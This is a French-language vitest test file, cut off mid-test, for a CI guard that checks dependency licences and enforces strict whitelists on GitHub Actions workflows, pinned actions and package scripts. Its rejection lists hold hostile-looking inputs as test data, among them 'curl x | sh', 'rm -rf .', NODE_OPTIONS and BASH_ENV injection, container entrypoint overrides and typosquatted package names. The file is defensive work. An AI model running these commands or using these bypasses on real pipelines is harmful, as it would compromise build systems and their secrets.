import { readdirSync, readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dump, load } from "js-yaml";
import { describe, expect, it } from "vitest";
import { verifierInstallationsFigees, verifierLicences, verifierLicencesLivrees, verifierScriptsPaquets, verifierWorkflowsLicences } from "./garde-licences.js";

const lire = (chemin: string) => readFileSync(fileURLToPath(new URL(`../${chemin}`, import.meta.url)), "utf8");
const fixture = (nom: string) => lire(`scripts/__fixtures__/briques/${nom}`);

const paquet = (name: string) => [{ name, versions: ["1.0.0"] }];

describe("garde-licences", () => {
  it("accepte les licences permises", () => {
    const data = { MIT: paquet("a"), "Apache-2.0": paquet("b"), "BSD-3-Clause": paquet("c"), ISC: paquet("d"), "0BSD": paquet("e"), "OFL-1.1": paquet("f") };
    expect(verifierLicences(data, new Set())).toEqual([]);
  });
  it("refuse une licence hors liste", () => {
    expect(verifierLicences({ "GPL-3.0": paquet("x") }, new Set()).join("\n")).toContain("x");
  });
  it("refuse une licence inconnue", () => {
    expect(verifierLicences({ Unknown: paquet("y") }, new Set()).join("\n")).toContain("y");
  });
  it("MPL-2.0 seulement pour les paquets de apps/api, apps/console et apps/portail", () => {
    expect(verifierLicences({ "MPL-2.0": paquet("m") }, new Set(["m"]))).toEqual([]);
    expect(verifierLicences({ "MPL-2.0": paquet("m") }, new Set(["autre"]))).not.toEqual([]);
  });
  it("lit une expression OR : une branche permise suffit", () => {
    expect(verifierLicences({ "(MIT OR GPL-3.0)": paquet("z") }, new Set())).toEqual([]);
    expect(verifierLicences({ "(MIT AND GPL-3.0)": paquet("z") }, new Set())).not.toEqual([]);
  });
});

describe("garde-licences : exceptions nommées (dépendances de développement)", () => {
  const dev = { "Python-2.0": paquet("argparse"), "BlueOak-1.0.0": paquet("minimatch") };
  it("accepte argparse (Python-2.0) et minimatch (BlueOak-1.0.0) quand ce sont des dépendances de développement", () => {
    expect(verifierLicences(dev, new Set(), new Set(["eslint"]))).toEqual([]);
  });
  it("refuse un paquet non listé, même en développement", () => {
    expect(verifierLicences({ "Python-2.0": paquet("autre") }, new Set(), new Set())).not.toEqual([]);
  });
  it("refuse la même licence sur un autre paquet que celui nommé", () => {
    expect(verifierLicences({ "BlueOak-1.0.0": paquet("argparse") }, new Set(), new Set())).not.toEqual([]);
  });
  it("refuse argparse ou minimatch quand ils sont une dépendance de production", () => {
    expect(verifierLicences(dev, new Set(), new Set(["argparse", "minimatch"]))).toHaveLength(2);
  });
});

describe("garde-licences : exception MIT-0 nommée pour nodemailer (ADR 0008)", () => {
  it("accepte nodemailer (MIT-0) quand c'est une dépendance de développement", () => {
    expect(verifierLicences({ "MIT-0": paquet("nodemailer") }, new Set(), new Set(["eslint"]))).toEqual([]);
  });
  it("refuse toute autre dépendance en MIT-0", () => {
    expect(verifierLicences({ "MIT-0": paquet("autre") }, new Set(), new Set())).toHaveLength(1);
  });
  it("refuse nodemailer quand c'est une dépendance de production", () => {
    expect(verifierLicences({ "MIT-0": paquet("nodemailer") }, new Set(), new Set(["nodemailer"]))).toHaveLength(1);
  });
});

describe("garde-licences : expressions composées", () => {
  const refuse = (expr: string) => verifierLicences({ [expr]: paquet("z") }, new Set()).length;
  it("refuse GPL-3.0-only AND (MIT OR Apache-2.0)", () => {
    expect(refuse("GPL-3.0-only AND (MIT OR Apache-2.0)")).toBe(1);
  });
  it("accepte (MIT OR Apache-2.0) AND ISC et MIT OR GPL-3.0-only", () => {
    expect(refuse("(MIT OR Apache-2.0) AND ISC")).toBe(0);
    expect(refuse("MIT OR GPL-3.0-only")).toBe(0);
  });
  it("AND lie plus fort que OR : GPL-3.0-only AND MIT OR ISC se lit (GPL AND MIT) OR ISC", () => {
    expect(refuse("GPL-3.0-only AND MIT OR ISC")).toBe(0);
    expect(refuse("GPL-3.0-only OR (GPL-2.0-only AND MIT)")).toBe(1);
  });
  it("refuse une expression illisible", () => {
    expect(refuse("(MIT OR")).toBe(1);
    expect(refuse("MIT MIT")).toBe(1);
  });
});

describe("garde-licences : licences du livre", () => {
  const paquet = (name: string) => [{ name, versions: ["1.0.0"] }];
  it("[A-376] garde-licences accepte la licence PostgreSQL", () => {
    expect(verifierLicences({ PostgreSQL: paquet("p") }, new Set())).toEqual([]);
    expect(verifierLicences({ "(PostgreSQL OR GPL-3.0-only)": paquet("p") }, new Set())).toEqual([]);
  });
  it("[A-287] garde-licences refuse MPL-2.0 dans apps/executeur", () => {
    // « m » est aussi une dépendance de apps/executeur : la permission de apps/api ne la couvre plus.
    expect(verifierLicences({ "MPL-2.0": paquet("m") }, new Set(["m"]), new Set(), new Set(["m"]))).toHaveLength(1);
    expect(verifierLicences({ "MPL-2.0": paquet("m") }, new Set(["m"]), new Set(), new Set(["autre"]))).toEqual([]);
  });
  it("[A-287] garde-licences refuse MPL-2.0 dans une licence composée d'une dépendance livrée", () => {
    expect(verifierLicences({ "(MPL-2.0 AND MIT)": paquet("m") }, new Set(["m"]), new Set(), new Set(["m"]))).toHaveLength(1);
  });
  it("[A-402] garde-licences refuse une dépendance GPL dans packages/connecteurs-essai", () => {
    const data = JSON.parse(fixture("licences-connecteurs-essai.json"));
    const r = verifierLicencesLivrees(data, "packages/connecteurs-essai");
    expect(r).toHaveLength(1);
    expect(r[0]).toMatch(/bibliotheque-copyleft.*packages\/connecteurs-essai/);
  });
  it("[A-402] garde-licences pour le livré n'accepte que les six licences : ni 0BSD, ni OFL, ni MPL", () => {
    for (const l of ["0BSD", "OFL-1.1", "MPL-2.0", "Python-2.0", "MIT-0", "Unknown"]) {
      expect(verifierLicencesLivrees({ [l]: paquet("p") }, "apps/executeur"), l).toHaveLength(1);
    }
    for (const l of ["MIT", "BSD-2-Clause", "BSD-3-Clause", "ISC", "Apache-2.0", "PostgreSQL"]) {
      expect(verifierLicencesLivrees({ [l]: paquet("p") }, "apps/executeur"), l).toEqual([]);
    }
  });
});

describe("garde-licences : liste blanche des workflows", () => {
  type Obj = Record<string, unknown>;
  const CHECKOUT = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1";
  const NODE = "actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1";
  const INSTALLER = { run: "pnpm install --frozen-lockfile" };
  const modele = (): Obj[] => [{ uses: CHECKOUT, with: { "persist-credentials": false } }, { uses: NODE, with: { "node-version-file": ".nvmrc" } }, { run: "corepack enable" }, INSTALLER, { run: "node scripts/garde-licences.ts" }];
  const wf = (etapes: Obj[], job: Obj = {}, haut: Obj = {}, on: unknown = { pull_request: null }) => dump({ name: "x", on, permissions: { contents: "read" }, jobs: { j: { "runs-on": "ubuntu-latest", steps: etapes, ...job } }, ...haut });
  const fich = (texte: string) => [{ nom: "w.yml", texte }];
  const avecEtape = (e: Obj, k = 0) => modele().flatMap((x, i) => (i === k ? [e, x] : [x]));
  const dossier = () => {
    const base = fileURLToPath(new URL("../.github/workflows", import.meta.url));
    return readdirSync(base).filter((f) => /\.ya?ml$/.test(f)).map((f) => ({ nom: f, texte: readFileSync(`${base}/${f}`, "utf8") }));
  };
  const remplace = (k: number, e: Obj) => modele().map((x, i) => (i === k ? e : x));

  it("[C-019] garde-licences tourne sur chaque PR, dans la forme exacte du modèle", () => {
    expect(verifierWorkflowsLicences(dossier())).toEqual([]);
    expect(verifierWorkflowsLicences(fich(wf(modele())))).toEqual([]);
    expect(verifierWorkflowsLicences(fich(wf(modele(), { name: "licences" }, {}, ["pull_request"])))).toEqual([]);
    expect(verifierWorkflowsLicences(fich(wf(remplace(0, { uses: CHECKOUT }))))).toEqual([]);
  });
  const gardeRefusee: [string, string][] = [
    ["checkout avec ref: main", wf(remplace(0, { uses: CHECKOUT, with: { "persist-credentials": false, ref: "main" } }))],
    ["checkout avec repository d'un autre dépôt", wf(remplace(0, { uses: CHECKOUT, with: { repository: "autre/depot" } }))],
    ["checkout avec path", wf(remplace(0, { uses: CHECKOUT, with: { path: "ailleurs" } }))],
    ["checkout avec fetch-depth ou token", wf(remplace(0, { uses: CHECKOUT, with: { "persist-credentials": false, token: "x" } }))],
    ["checkout avec persist-credentials vrai", wf(remplace(0, { uses: CHECKOUT, with: { "persist-credentials": true } }))],
    ["checkout dont la casse change", wf(remplace(0, { uses: CHECKOUT.replace("actions/checkout", "Actions/Checkout") }))],
    ["checkout d'un autre commit", wf(remplace(0, { uses: CHECKOUT.replace("3d3c", "0000") }))],
    ["deuxième checkout après le premier", wf(avecEtape({ uses: CHECKOUT, with: { ref: "main" } }, 1))],
    ["étape en plus avant la garde", wf(avecEtape({ run: "echo bonjour" }, 2))],
    ["étape en plus après la garde", wf([...modele(), { run: "echo bonjour" }])],
    ["étape retirée", wf(modele().filter((_, i) => i !== 2))],
    ["ordre changé", wf([...modele().slice(0, 2), modele()[3] ?? {}, modele()[2] ?? {}, modele()[4] ?? {}])],
    ["étape avec name", wf(remplace(4, { name: "garde", run: "node scripts/garde-licences.ts" }))],
    ["action locale à la place du checkout", wf(remplace(0, { uses: "./outils/installer" }))],
    ["action docker", wf(remplace(0, { uses: "docker://node:20", with: { args: "pnpm install" } }))],
    ...["--check", "-e x", "&", "| cat", "|| true", "; true", "\nexit 0", "&& true"].map((s): [string, string] => [`garde suivie de « ${s.replace("\n", "\\n")} »`, wf(remplace(4, { run: `node scripts/garde-licences.ts ${s}` }))]),
    ["garde lancée par bash", wf(remplace(4, { run: "bash scripts/garde-licences.ts" }))],
    ["garde avec shell", wf(remplace(4, { run: "node scripts/garde-licences.ts", shell: "python {0}" }))],
    ["garde avec working-directory", wf(remplace(4, { run: "node scripts/garde-licences.ts", "working-directory": "tests" }))],
    ["garde avec env", wf(remplace(4, { run: "node scripts/garde-licences.ts", env: { NODE_OPTIONS: "--require x" } }))],
    ["garde conditionnelle ou tolérée", wf(remplace(4, { run: "node scripts/garde-licences.ts", "continue-on-error": true }))],
    ["garde avec if", wf(remplace(4, { run: "node scripts/garde-licences.ts", if: "false" }))],
    ["job avec needs", wf(modele(), { needs: "autre" })],
    ["job avec defaults", wf(modele(), { defaults: { run: { shell: "python {0}" } } })],
    ["job avec env", wf(modele(), { env: { NODE_OPTIONS: "--require x" } })],
    ["job avec container, strategy, if, timeout-minutes, continue-on-error", wf(modele(), { container: "node:20" })],
    ["job conditionnel", wf(modele(), { if: "false" })],
    ["job toléré", wf(modele(), { "continue-on-error": true })],
    ["job sur un autre exécuteur", wf(modele(), { "runs-on": "self-hosted" })],
    ["env au niveau du workflow", wf(modele(), {}, { env: { NODE_OPTIONS: "--require x" } })],
    ["defaults au niveau du workflow", wf(modele(), {}, { defaults: { run: { shell: "python {0}" } } })],
    ["déclencheur limité par branches", wf(modele(), {}, {}, { pull_request: { branches: ["autre"] } })],
    ["déclencheur limité par paths", wf(modele(), {}, {}, { pull_request: { paths: ["docs/**"] } })],
    ["déclencheur limité par types", wf(modele(), {}, {}, { pull_request: { types: ["closed"] } })],
    ["déclencheur push seul", wf(modele(), {}, {}, { push: null })],
    ["déclencheur pull_request_target seul", wf(modele(), {}, {}, { pull_request_target: null })],
    ["aucune garde", wf([{ run: "echo rien" }])],
    ["garde en commentaire", wf([{ run: "# node scripts/garde-licences.ts" }])],
    ["garde dans un echo", wf([{ run: "echo node scripts/garde-licences.ts" }])],
  ];
  it.each(gardeRefusee)("[C-019] refuse : %s", (_nom, texte) => {
    expect(verifierWorkflowsLicences(fich(texte))).not.toEqual([]);
  });

  it("[C-020] chaque installation de la CI est dans la liste blanche", () => {
    expect(verifierInstallationsFigees(dossier())).toEqual([]);
  });
  it("[C-020] accepte seulement les formes exactes : installation figée, bloc connu, actions épinglées", () => {
    const ok = (etapes: Obj[]) => verifierInstallationsFigees(fich(wf(etapes)));
    expect(ok([{ uses: CHECKOUT }, { run: "corepack enable" }, INSTALLER, { run: "pnpm lint" }])).toEqual([]);
    expect(ok([{ run: "pnpm install --frozen-lockfile\n" }])).toEqual([]);
  });
  const installRefusee = [
    ...["pnpm install", "pnpm i", "pnpm  install --frozen-lockfile", "pnpm install  --frozen-lockfile", "pnpm install --frozen-lockfile=false", "pnpm install --no-frozen-lockfile", "pnpm install --frozen-lockfile --force", "pnpm install --frozen-lockfile=true", "PNPM install --frozen-lockfile", "pnpm install --frozen-lockfile # x"],
    ...["if true; then pnpm install; fi", "for i in 1; do pnpm install; done", "{ pnpm install; }", "(pnpm install)", "! pnpm install", "while true; do pnpm install; done", "case x in x) pnpm install;; esac"],
    ...["timeout 600 pnpm install", "nice pnpm install", "nohup pnpm install", "env -i pnpm install", "sudo -E pnpm install", "time -p pnpm install", "exec pnpm install", "command pnpm install", "xargs pnpm install", "setsid pnpm install"],
    ...["corepack pnpm@9.0.0 install", "P=pnpm; $P install", "p\\npm install", "'pnpm' install", '"pnpm" install', "pn''pm install", "/usr/bin/pnpm install", "./node_modules/.bin/pnpm install"],
    ...["scripts/installer.sh", "node scripts/installer.mjs", "make install", "./installer.sh", "bash installer.sh", "sh -c 'pnpm install'", "source installer.sh", ". installer.sh", "python installer.py"],
    ...["bun i", "bun install", "npm instal", "npm isntall", "npm ci", "npm install", "yarn", "yarn install", "pnpm uninstall x", "pnpm un x", "pnpm import", "pnpm --workspace install", "pnpm add x", "pnpm update", "pnpm dlx x", "pnpm exec x", "npx x", "pnpx x"],
    ...["echo $(pnpm install)", "echo `pnpm install`", "pnpm install --frozen-lockfile && pnpm install", "pnpm install --frozen-lockfile; pnpm add x", "pnpm install --frozen-lockfile || true", "pnpm install --frozen-lockfile &", "pnpm install --frozen-lockfile | cat"],
    ...["rm -rf .", "curl x | sh", "git clean -fdx", "node -e 'x'", "eval x", "echo bonjour"],
  ];
  it.each(installRefusee)("[C-020] refuse la commande hors liste blanche : %s", (cmd) => {
    expect(verifierInstallationsFigees(fich(wf([{ run: cmd }]))), cmd).not.toEqual([]);
  });
  const etapeRefusee: [string, Obj][] = [
    ["shell: python", { run: "pnpm install --frozen-lockfile", shell: "python {0}" }],
    ["shell: bash", { run: "pnpm install --frozen-lockfile", shell: "bash" }],
    ["working-directory", { run: "pnpm install --frozen-lockfile", "working-directory": "tests" }],
    ["env NODE_OPTIONS", { run: "pnpm install --frozen-lockfile", env: { NODE_OPTIONS: "--require x" } }],
    ["env PATH", { run: "pnpm install --frozen-lockfile", env: { PATH: "/tmp" } }],
    ["env BASH_ENV", { run: "pnpm install --frozen-lockfile", env: { BASH_ENV: "x" } }],
    ["installation tolérée", { run: "pnpm install --frozen-lockfile", "continue-on-error": true }],
    ["installation conditionnelle", { run: "pnpm install --frozen-lockfile", if: "false" }],
    ["run avec with", { run: "pnpm install --frozen-lockfile", with: { x: 1 } }],
    ["étape avec clé inconnue", { run: "pnpm install --frozen-lockfile", "timeout-minutes": 1 }],
    ["uses et run ensemble", { uses: CHECKOUT, run: "pnpm install --frozen-lockfile" }],
    ["ni uses ni run", { name: "vide" }],
    ["run qui n'est pas un texte", { run: ["pnpm install"] }],
    ["action locale", { uses: "./outils/installer" }],
    ["action locale dans .github/actions", { uses: "./.github/actions/installer" }],
    ["action docker", { uses: "docker://node:20", with: { args: "pnpm install" } }],
    ["actions/github-script", { uses: `actions/github-script@${"a".repeat(40)}`, with: { script: "require('child_process').execSync('pnpm install')" } }],
    ["pnpm/action-setup sans @", { uses: "pnpm/action-setup", with: { run_install: true } }],
    ["pnpm/action-setup épinglée", { uses: `pnpm/action-setup@${"a".repeat(40)}`, with: { run_install: true } }],
    ["action sur une étiquette de version", { uses: "actions/checkout@v4" }],
    ["checkout avec ref", { uses: CHECKOUT, with: { ref: "refs/heads/autre" } }],
    ["checkout avec repository", { uses: CHECKOUT, with: { repository: "autre/depot" } }],
    ["setup-node avec cache ou autre clé", { uses: NODE, with: { "node-version-file": ".nvmrc", cache: "pnpm" } }],
    ["setup-node sans with", { uses: NODE }],
    ["with nul", { uses: CHECKOUT, with: null }],
  ];
  it.each(etapeRefusee)("[C-020] refuse l'étape : %s", (_nom, etape) => {
    expect(verifierInstallationsFigees(fich(wf([etape])))).not.toEqual([]);
  });
  const formeRefusee: [string, string][] = [
    ["job qui appelle un workflow réutilisable", dump({ name: "x", on: "push", jobs: { j: { uses: "./.github/workflows/autre.yml" } } })],
    ["job sans étapes", dump({ name: "x", on: "push", jobs: { j: { "runs-on": "ubuntu-latest" } } })],
    ["job avec container", wf([{ run: "pnpm lint" }], { container: "node:20" })],
    ["job avec defaults", wf([{ run: "pnpm lint" }], { defaults: { run: { shell: "python {0}" } } })],
    ["job avec strategy", wf([{ run: "pnpm lint" }], { strategy: { matrix: { a: [1] } } })],
    ["job avec env PATH", wf([{ run: "pnpm lint" }], { env: { PATH: "/tmp" } })],
    ["workflow avec env", wf([{ run: "pnpm lint" }], {}, { env: { NODE_OPTIONS: "--require x" } })],
    ["workflow avec defaults", wf([{ run: "pnpm lint" }], {}, { defaults: { run: { shell: "python {0}" } } })],
    ["workflow sans jobs", dump({ name: "x", on: "push" })],
    ["workflow avec une clé inconnue", wf([{ run: "pnpm lint" }], {}, { inconnue: 1 })],
    ["workflow qui n'est pas un objet", "- a\n- b\n"],
  ];
  it.each(formeRefusee)("[C-020] refuse la forme : %s", (_nom, texte) => {
    expect(verifierInstallationsFigees(fich(texte))).not.toEqual([]);
  });
  it("[C-020] les actions composites sont lues : seule la forme connue passe", () => {
    const action = (runs: Obj, haut: Obj = {}) => [{ nom: "x/action.yml", texte: dump({ name: "x", runs, ...haut }) }];
    expect(verifierInstallationsFigees(action({ using: "composite", steps: [{ run: "pnpm install --frozen-lockfile", shell: "bash" }] }))).toEqual([]);
    for (const mauvais of [
      action({ using: "composite", steps: [{ run: "pnpm install", shell: "bash" }] }),
      action({ using: "composite", steps: [{ run: "pnpm install --frozen-lockfile", shell: "python {0}" }] }),
      action({ using: "composite", steps: [{ run: "pnpm install --frozen-lockfile" }] }),
      action({ using: "composite", steps: [{ uses: "./outils/installer" }] }),
      action({ using: "node20", main: "index.js" }),
      action({ using: "docker", image: "Dockerfile" }),
      action({ using: "composite", steps: [{ run: "pnpm lint", shell: "bash" }], post: "x" }),
      action({ using: "composite", steps: [{ run: "pnpm lint", shell: "bash" }] }, { inputs: { x: {} } }),
    ]) {
      expect(verifierInstallationsFigees(mauvais)).not.toEqual([]);
    }
  });
  it("[C-020] les scripts de package.json sont dans la liste blanche, texte exact", () => {
    const racine = fileURLToPath(new URL("..", import.meta.url));
    const paquets = readdirSync(racine, { recursive: true, encoding: "utf8" }).filter((f) => /(^|\/)package\.json$/.test(f) && !f.includes("node_modules")).map((f) => ({ nom: f, texte: readFileSync(`${racine}${f}`, "utf8") }));
    expect(paquets.length).toBeGreaterThan(3);
    expect(verifierScriptsPaquets(paquets)).toEqual([]);
    const script = (cmd: unknown) => verifierScriptsPaquets([{ nom: "package.json", texte: JSON.stringify({ scripts: { ci: cmd } }) }]);
    for (const mauvais of ["timeout 9 pnpm install", "if true; then pnpm install; fi", "pnpm install", "pnpm add x", "vitest run && pnpm install", "node scripts/installer.mjs", "make install", "vitest run ", "eslint . ", 42, null, ["pnpm install"]]) {
      expect(script(mauvais), String(mauvais)).not.toEqual([]);
    }
    expect(verifierScriptsPaquets([{ nom: "package.json", texte: JSON.stringify({ scripts: ["pnpm install"] }) }])).not.toEqual([]);
    expect(verifierScriptsPaquets([{ nom: "package.json", texte: "{" }])).not.toEqual([]);
  });
  it("[C-020] toute forme inconnue est refusée : une série de formes nouvelles est écartée", () => {
    const nouvelles = ["pnpm install --frozen-lockfile\npnpm install", "pnpm install --frozen-lockfile\t&& x", "​pnpm install --frozen-lockfile", "pnpm install --frozen-lockfile", "pnpm install --frozen-lockfile\\\n --force", "pnpm install --frozen-lockfile --ignore-scripts=false", "pnpm install --frozen-lockfile --filter x", "pnpm install --frozen-lockfile -r", "pnpm  --frozen-lockfile install", "pnpm i --frozen-lockfile", "pnpm install-test", "pnpm it --frozen-lockfile", "pnpm rebuild", "pnpm prune", "pnpm fetch", "pnpm patch x", "corepack enable && pnpm install --frozen-lockfile", "corepack enable; pnpm lint", "corepack prepare pnpm@9 --activate", "echo ok > scripts/garde-licences.ts", "git checkout main -- scripts/garde-licences.ts", "sed -i s/a/b/ scripts/garde-licences.ts", "mv scripts/installer.ts scripts/garde-licences.ts", "node scripts/garde-licences.ts --version", "node ./scripts/garde-licences.ts", "node scripts/../scripts/garde-licences.ts"];
    expect(nouvelles.length).toBeGreaterThanOrEqual(15);
    for (const cmd of nouvelles) expect(verifierInstallationsFigees(fich(wf([{ run: cmd }]))), cmd).not.toEqual([]);
  });
  const SHA_CONNUS = ["3d3c42e5aac5ba805825da76410c181273ba90b1", "949feb2413d6458794dcd2491c4babbbce0c15c1", "043fb46d1a93c77aae656e7c1c64a875d1fc6a0a", "8498dc4c2b27cdd99baf0f87955b29ebbf30c78d", "ff98106e4c7b2bc287b24eaf42907196329070c7"];
  it("[C-020] tous les « uses » du dépôt sont l'un des 6 textes exacts connus", () => {
    const usages = new Set(dossier().flatMap((f) => [...f.texte.matchAll(/^\s*-?\s*uses:\s*(\S+)/gm)].map((m) => m[1])));
    expect(usages.size).toBe(6);
    for (const u of usages) expect(SHA_CONNUS.some((sha) => u?.endsWith(`@${sha}`)), u).toBe(true);
  });
  const SHA_FORK = "1".repeat(40);
  const usesRefuse: [string, string, Obj | undefined][] = [
    ["checkout sur un SHA inconnu (commit de fork)", `actions/checkout@${SHA_FORK}`, undefined],
    ["setup-node sur un SHA inconnu (commit de fork)", `actions/setup-node@${SHA_FORK}`, { "node-version-file": ".nvmrc" }],
    ["upload-artifact sur un SHA inconnu", `actions/upload-artifact@${SHA_FORK}`, { name: "rapport-couverture", path: "rapport-couverture.json" }],
    ["codeql init sur un SHA inconnu", `github/codeql-action/init@${SHA_FORK}`, { languages: "javascript-typescript", "build-mode": "none" }],
    ["codeql analyze sur un SHA inconnu", `github/codeql-action/analyze@${SHA_FORK}`, undefined],
    ["gitleaks sur un SHA inconnu", `gitleaks/gitleaks-action@${SHA_FORK}`, undefined],
    ["checkout sur une étiquette", "actions/checkout@v4", undefined],
    ["checkout sur une branche", "actions/checkout@main", undefined],
    ["checkout sur un SHA court", "actions/checkout@3d3c42e", undefined],
    ["checkout avec le SHA connu en majuscules", `actions/checkout@${SHA_CONNUS[0]?.toUpperCase()}`, undefined],
    ["checkout avec un SHA connu d'une autre action", `actions/checkout@${SHA_CONNUS[1]}`, undefined],
    ["checkout avec un sous-chemin", `actions/checkout/sous@${SHA_CONNUS[0]}`, undefined],
    ["checkout suivi d'une espace", `actions/checkout@${SHA_CONNUS[0]} `, undefined],
    ["checkout d'un autre propriétaire", `autre/checkout@${SHA_CONNUS[0]}`, undefined],
  ];
  it.each(usesRefuse)("[C-020] refuse : %s", (_nom, uses, avec) => {
    const e = avec === undefined ? { uses } : { uses, with: avec };
    expect(verifierInstallationsFigees(fich(wf([e])))).not.toEqual([]);
    expect(verifierInstallationsFigees([{ nom: "x/action.yml", texte: dump({ name: "x", runs: { using: "composite", steps: [e] } }) }])).not.toEqual([]);
  });
  it("[C-020] accepte chacun des textes exacts connus", () => {
    const connus: [string, Obj | undefined][] = [
      [CHECKOUT, undefined], [NODE, { "node-version-file": ".nvmrc" }], [`actions/upload-artifact@${SHA_CONNUS[2]}`, { name: "rapport-couverture", path: "rapport-couverture.json" }],
      [`github/codeql-action/init@${SHA_CONNUS[3]}`, { languages: "javascript-typescript", "build-mode": "none" }], [`github/codeql-action/analyze@${SHA_CONNUS[3]}`, undefined], [`gitleaks/gitleaks-action@${SHA_CONNUS[4]}`, undefined],
    ];
    for (const [uses, avec] of connus) expect(verifierInstallationsFigees(fich(wf([avec === undefined ? { uses } : { uses, with: avec }]))), uses).toEqual([]);
  });
  const MAILPIT = {
    mailpit: {
      image: "axllent/mailpit:v1.20.4@sha256:ff82a613c735f4e8a3ddfdf7ee4e18cb934c721e72a340ecbbb7ec0ca7fbd057",
      ports: ["127.0.0.1:8025:8025", "127.0.0.1:1025:1025"],
      options: '--health-cmd "/mailpit readyz" --health-interval 2s --health-timeout 3s --health-retries 30',
    },
  };
  const servicesRefuses: [string, unknown][] = [
    ["image quelconque", { mailpit: { ...MAILPIT.mailpit, image: "autre/image:1" } }],
    ["image en expression", { mailpit: { ...MAILPIT.mailpit, image: "${{ github.event.pull_request.title }}" } }],
    ["image sans empreinte", { mailpit: { ...MAILPIT.mailpit, image: "axllent/mailpit:v1.20.4" } }],
    ["--entrypoint dans options", { mailpit: { ...MAILPIT.mailpit, options: `${MAILPIT.mailpit.options} --entrypoint sh` } }],
    ["volume sur l'espace de travail", { mailpit: { ...MAILPIT.mailpit, volumes: ["${{ github.workspace }}:/w"] } }],
    ["env du service", { mailpit: { ...MAILPIT.mailpit, env: { X: "1" } } }],
    ["credentials du service", { mailpit: { ...MAILPIT.mailpit, credentials: { username: "u", password: "p" } } }],
    ["port en plus", { mailpit: { ...MAILPIT.mailpit, ports: [...MAILPIT.mailpit.ports, "0.0.0.0:22:22"] } }],
    ["port ouvert à tous", { mailpit: { ...MAILPIT.mailpit, ports: ["8025:8025", "1025:1025"] } }],
    ["second service", { ...MAILPIT, autre: MAILPIT.mailpit }],
    ["service renommé", { autre: MAILPIT.mailpit }],
    ["services vide", {}],
    ["services nul", null],
    ["services en liste", [MAILPIT.mailpit]],
    ["services en texte", "mailpit"],
  ];
  it("[C-020] accepte « services » seulement s'il est égal au bloc Mailpit épinglé (ordre des clés libre)", () => {
    expect(verifierInstallationsFigees(fich(wf([{ run: "pnpm lint" }], { services: MAILPIT })))).toEqual([]);
    const m = MAILPIT.mailpit;
    expect(verifierInstallationsFigees(fich(wf([{ run: "pnpm lint" }], { services: { mailpit: { options: m.options, ports: m.ports, image: m.image } } })))).toEqual([]);
  });
  it.each(servicesRefuses)("[C-020] refuse « services » : %s", (_nom, services) => {
    expect(verifierInstallationsFigees(fich(wf([{ run: "pnpm lint" }], { services })))).not.toEqual([]);
    expect(verifierInstallationsFigees(fich(wf(modele(), { services })))).not.toEqual([]);
  });
  const runsOnRefuse: [string, unknown][] = [
    ["self-hosted", "self-hosted"], ["une liste", ["ubuntu-latest"]], ["ubuntu-24.04", "ubuntu-24.04"], ["windows-latest", "windows-latest"], ["une casse différente", "Ubuntu-Latest"],
    ["une espace en plus", "ubuntu-latest "], ["une expression", "${{ matrix.os }}"], ["un groupe", { group: "g", labels: "self-hosted" }], ["rien", undefined],
  ];
  it.each(runsOnRefuse)("[C-020] refuse « runs-on » : %s", (_nom, valeur) => {
    expect(verifierInstallationsFigees(fich(wf([{ run: "pnpm lint" }], { "runs-on": valeur })))).not.toEqual([]);
  });
  it("[C-020] refuse container, strategy et un job sans runs-on, même avec des étapes connues", () => {
    for (const job of [{ container: { image: "node:20", options: "--entrypoint sh" } }, { strategy: { matrix: { os: ["self-hosted"] } } }, { "runs-on": "${{ fromJSON(github.event.pull_request.title) }}" }]) {
      expect(verifierInstallationsFigees(fich(wf([{ run: "pnpm lint" }], job)))).not.toEqual([]);
    }
  });
  it("[C-020] CODEOWNERS couvre scripts, ops, .github, package.json, .npmrc, .nvmrc et .pnpmfile.cjs", () => {
    const texte = lire(".github/CODEOWNERS");
    const lignes = texte.split("\n").filter((l) => l.trim() && !l.startsWith("#"));
    for (const chemin of ["/scripts/", "/ops/", "/.github/", "package.json", "/.npmrc", "/.nvmrc", "/.pnpmfile.cjs"]) {
      expect(lignes.some((l) => l.split(/\s+/)[0] === chemin && l.split(/\s+/).slice(1).every((o) => /^@will383842$/.test(o)) && l.split(/\s+/).length === 2), chemin).toBe(true);
    }
  });
  it("[C-020] un workflow illisible est refusé (échec fermé)", () => {
    expect(verifierInstallationsFigees([{ nom: "w.yml", texte: "jobs: [" }])).not.toEqual([]);
    expect(verifierWorkflowsLicences([{ nom: "w.yml", texte: "jobs: [" }])).not.toEqual([]);
    expect(verifierInstallationsFigees([{ nom: "w.yml", texte: "a: 1\na: 2\n" }])).not.toEqual([]);
  });
});

describe("garde-licences : exception CC-BY-4.0 nommée pour caniuse-lite (ADR 0011)", () => {
  const prod = new Set(["caniuse-lite"]);
  const verifier = (licence: string, nom: string, production: Set<string> = prod) => verifierLicences({ [licence]: paquet(nom) }, new Set(), production);

  it("[A-047] accepte caniuse-lite en CC-BY-4.0 quand c'est une dépendance de production", () => {
    expect(verifier("CC-BY-4.0", "caniuse-lite")).toEqual([]);
  });
  it("[A-047] refuse caniuse-lite en CC-BY-4.0 hors production", () => {
    expect(verifier("CC-BY-4.0", "caniuse-lite", new Set())).toHaveLength(1);
  });
  it("[A-047] refuse un autre paquet en CC-BY-4.0, même en production", () => {
    expect(verifier("CC-BY-4.0", "autre", new Set(["autre"]))).toHaveLength(1);
  });
  it("[A-047] refuse un nom usurpé : autre portée ou nom proche", () => {
    for (const nom of ["@evil/caniuse-lite", "@types/caniuse-lite", "caniuse-lite2", "caniuse-lit", "Caniuse-Lite"]) {
      expect(verifier("CC-BY-4.0", nom, new Set([nom]))).toHaveLength(1);
    }
  });
  it("[A-047] refuse une autre licence ou une autre version de licence sur caniuse-lite", () => {
    for (const licence of ["CC-BY-3.0", "CC-BY-2.5", "CC-BY-NC-4.0", "CC-BY-NC", "CC-BY-SA-4.0", "CC-BY-SA", "CC-BY-ND-4.0", "CC0-1.0", "CC-BY-4.0-only", "GPL-3.0"]) {
      expect(verifier(licence, "caniuse-lite")).toHaveLength(1);
    }
  });
  it("[A-047] refuse les variantes de casse ou d'écriture de la licence", () => {
    for (const licence of ["cc-by-4.0", "Cc-By-4.0", "CC-BY-4.0 ", " CC-BY-4.0", "CC-BY-4.0+", "CC BY 4.0"]) {
      expect(verifier(licence, "caniuse-lite")).toHaveLength(1);
    }
  });
  it("[A-047] refuse un SPDX composite contenant CC-BY-4.0", () => {
